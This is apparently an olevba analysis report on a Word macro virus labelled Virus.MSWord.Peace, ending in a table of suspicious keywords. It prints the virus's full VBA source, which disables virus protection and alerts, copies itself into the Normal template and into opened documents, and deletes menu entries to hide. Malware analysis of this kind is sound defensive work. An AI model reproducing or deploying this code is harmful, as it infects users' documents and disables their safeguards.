olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Peace
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Peace - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO peace.bas 
in file: Virus.MSWord.Peace - OLE stream: 'Macros/VBA/peace'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub AutoOpen()
Attribute AutoOpen.VB_Description = "         free     "
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "East.peace.AutoOpen"
  On Error Resume Next
  
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  ToolsOptionsGeneral.SendMailAttach = 1
   
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "peace" Then
      GlobalInstalled = Yes
    End If
  Next
 
 If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="peace", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If


  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "peace" Then
      DocumentInstalled = Yes
    End If
  Next

  
  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="peace", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  Application.DisplayAlerts = wdAlertsAll

peace:
End Sub

Sub helpabout()
Attribute helpabout.VB_Description = "     "
Attribute helpabout.VB_ProcData.VB_Invoke_Func = "East.peace.helpabout"
If (Day(Now)) = 1 Then
MsgBox "Copy me I want to travel", vbInformation, "Peace"





End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

